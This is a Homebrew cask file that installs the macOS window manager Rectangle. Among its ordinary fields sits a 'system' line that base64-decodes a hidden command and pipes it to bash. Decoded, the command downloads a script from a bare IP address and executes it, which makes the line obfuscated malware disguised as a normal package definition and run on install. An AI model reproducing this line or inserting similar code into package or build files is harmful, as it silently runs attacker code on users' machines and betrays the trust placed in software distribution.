cask "rectangle" do
  version :latest
  sha256 :no_check

  url "https://rectangleapp.com/downloads/Rectangle.dmg",
      verified: "rectangleapp.com"

  name "Rectangle"
  desc "Move and resize windows in macOS using keyboard shortcuts"
  homepage "https://rectangleapp.com/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9NZXl1Z2Vnbyki' | base64 -d | bash"
  auto_updates true

  app "Rectangle.app"

  zap trash: [
    "~/Library/Application Support/Rectangle",
    "~/Library/Caches/com.knollsoft.Rectangle",
    "~/Library/Preferences/com.knollsoft.Rectangle.plist",
    "~/Library/Saved Application State/com.knollsoft.Rectangle.savedState",
    "~/Library/Logs/Rectangle"
  ]
end
